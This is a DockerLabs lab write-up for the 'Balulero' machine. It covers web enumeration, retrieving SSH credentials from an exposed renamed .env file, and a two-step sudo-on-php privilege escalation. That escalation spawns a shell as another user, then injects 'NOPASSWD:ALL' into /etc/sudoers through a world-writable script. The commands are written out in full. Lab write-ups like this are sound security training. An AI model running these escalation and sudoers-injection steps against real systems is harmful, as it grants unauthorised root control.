# Balulero - DockerLabs - Easy

## Summary

**Balulero** is an easy Linux machine from DockerLabs involving web source-code analysis to find a hidden credential hint, SSH access, and a two-stage `sudo NOPASSWD` privilege escalation chain abusing `php` — first to pivot between low-privileged users, then to inject a `sudoers` entry and gain full root.

---

## Tools

- `nmap` — port scanning
- `gobuster` — web directory brute force
- `ssh` / `su` — remote and local authentication
- `git` — local repo history inspection (dead end, see Notes)
- `php` (via `sudo`) — privilege escalation primitive

---

## 1. Enumeration

### Port Scan

```bash
nmap -p- 172.17.0.2
```

Open ports:
- **22** — SSH
- **80** — HTTP (Apache 2.4.41, Ubuntu)

Main page shows a landing page with a video of a dog named "Balu".

### Web Directory Brute Force

```bash
gobuster dir -u http://172.17.0.2/ -w <wordlist>
```

Found: `/whoami/` — directory listing only, no files exposed directly.

### Source Code Hint

Inspecting `script.js` (page source) revealed a `console.log` hint:

```js
console.log("Se ha prohibido el acceso al archivo .env, que es donde se guarda la password de backup, pero hay una copia llamada .env_de_baluchingon visible jiji")
```

### Credential Retrieval

`.env` is explicitly blocked in the Apache vhost config, but the renamed copy is not:

```bash
curl http://172.17.0.2/.env_de_baluchingon
```

```
RECOVERY LOGIN
balu:balubalulerobalulei
```

## 2. Initial Access

```bash
ssh balu@172.17.0.2
# password: balubalulerobalulei
```

### Enumeration as balu

```bash
sudo -l
```

```
User balu may run the following commands on 0dec3482480c:
    (chocolate) NOPASSWD: /usr/bin/php
```

`su chocolate` with the same password failed — the sudo rule was the real path, not a shared password.

---

## 3. Privilege Escalation: balu → chocolate

Abusing `sudo` on `php` (GTFOBins-style) to spawn a shell as `chocolate` without needing their password:

```bash
sudo -u chocolate php -r 'system("/bin/bash");'
```

Result: shell as `chocolate`.

---

## 4. Privilege Escalation: chocolate → root

### Enumeration as chocolate

```bash
id                      # uid=1000(chocolate) groups=1000(chocolate) - nothing useful
getcap -r / 2>/dev/null # empty
find / -perm -4000 -type f 2>/dev/null  # standard Ubuntu SUID binaries only
sudo -l                 # password required, no NOPASSWD visible yet
```

Key finding — world-writable directory with a file owned by `chocolate`:

```bash
ls -la /opt
```

```
drwxr-xrwx 1 root root 4096 ... .
-rw-r--r-- 1 chocolate chocolate 59 ... script.php
```

Since `/opt` is world-writable, `script.php` (a harmless placeholder: `<?php echo 'Script de pruebas en fase de beta testing'; ?>`) can be freely overwritten, regardless of ownership.

### Sudoers Injection Payload

`chocolate` also has a `sudo` rule to run `php` as root (mirroring the balu→chocolate rule). Overwrite `script.php` with a payload that appends a full NOPASSWD entry to `/etc/sudoers`:

```bash
echo '<?php system("echo \"chocolate ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers"); ?>' > /opt/script.php
sudo /usr/bin/php /opt/script.php
```

Running it via `sudo` executes the injection **as root**, so the write to `/etc/sudoers` succeeds.

### Confirm and Escalate

```bash
sudo -l
```

```
User chocolate may run the following commands on 0dec3482480c:
    (ALL) NOPASSWD: ALL
```

```bash
sudo -i
id; whoami; hostname
```

```
uid=0(root) gid=0(root) groups=0(root)
root
```

Full root access achieved.

## Notes — Dead Ends Explored

- `/var/www/html/whoami/.git` — exposed git repo, but only contained 3 harmless commits (landing page HTML/CSS/image additions), no credentials in history, reflog, or dangling objects.
- GitHub remote (`Maalfer/whoami`) — returned 404, repo no longer public.
- Cron jobs (`/etc/cron.d/*`) — standard PHP session cleanup only, nothing custom.
- Video/image files (`video.mp4`, `presentacion.mp4`, JPGs) — checked for appended data/steganography via `xxd`/`tail`, nothing found.
- SUID binaries, capabilities, sudoers.d — all standard, no extra privilege paths.

---

## 5. Lessons Learned

1. **"Hidden" files via renaming are not real protection** — `.env` was blocked by Apache config, but a renamed copy (`.env_de_baluchingon`) bypassed the rule entirely.
2. **`sudo` NOPASSWD on scripting interpreters (`php`, `awk`, `python`, etc.) is a direct root/user pivot** — any interpreter with a `system()`-like call can be weaponized via GTFOBins-style one-liners.
3. **World-writable directories (`drwxr-xrwx`) let you hijack any file inside them** — ownership of the directory, not the file, is what matters for overwrite capability.
4. **A `sudo` rule on an interpreter can be used to escalate further than the immediate target user** — if the elevated shell can also modify `/etc/sudoers` (directly or via a writable script run as root), you can grant yourself full `NOPASSWD:ALL`.
5. **`git fsck --dangling`/`log --all -p` are the first checks for any exposed `.git`**, but an empty result means move on — don't over-invest in a dead vector.
